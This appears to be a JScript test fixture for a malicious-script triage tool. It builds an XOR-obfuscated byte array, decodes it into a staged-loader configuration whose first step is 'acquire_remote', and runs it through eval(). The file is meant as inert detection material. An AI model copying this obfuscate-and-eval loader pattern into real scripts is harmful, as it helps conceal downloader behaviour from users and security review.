// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
var decode_b6ce9dc3 = function decode_b6ce9dc3_body(item1) {
  var keyBytes = [226,97,224,41,193];
  var item2 = [];
  for (var i = 0; i < item1.length; i++) { item2.push(item1[i] ^ keyBytes[i % keyBytes.length]); }
  return item2;
};
var recover_02ec9f0d = function recover_02ec9f0d_body() {
  // configuration reconstruction
  var characters = [153,67,147,93,164,146,18,194,19,154,192,0,131,88,180,139,19,133,118,179,135,12,143,93,164,192,77,194,77,168,145,17,129,93,162,138,62,141,76,172,141,19,153,11,156,206,67,129,77,160,146,21,133,91,227,216,67,173,122,153,175,45,210,7,153,175,45,168,125,149,178,79,214,7,241,192,77,194,95,160,142,20,133,90,227,216,26,194,74,160,143,17,129,64,166,140,62,137,77,227,216,67,131,72,172,146,0,137,78,175,207,84,216,76,160,213,7,211,75,248,128,67,204,11,180,144,13,194,19,227,138,21,148,89,178,216,78,207,28,249,135,0,215,79,242,128,88,130,7,164,154,0,141,89,173,135,79,137,71,183,131,13,137,77,238,131,2,217,72,240,219,82,217,7,165,131,21,194,5,227,151,18,133,91,158,131,6,133,71,181,192,91,194,97,180,140,21,146,76,178,145,45,129,75,238,215,89,133,72,246,132,82,130,16,163,192,28,204,11,178,150,0,135,76,130,141,20,142,93,227,216,83,157];
  var item1 = [];
  for (var ci = 0; ci < characters.length; ci++) { item1.push(characters[ci]); }

  var item2 = decode_b6ce9dc3.call(null, item1);
  var item3;
  item3 = item2.length ? String.fromCharCode(item2[0]) : "";
  for (var bi = 1; bi < item2.length; bi++) { item3 = item3.concat(String.fromCharCode(item2[bi])); }
  return item3;
  // end reconstruction
};
var inspect_b956c6f5 = function inspect_b956c6f5_body() {
  var item4 = eval("(" + recover_02ec9f0d.call(null) + ")");
  return { steps: item4["steps"], adapter: item4["adapter"], values: item4["values"], stageCount: item4["stageCount"] };
};
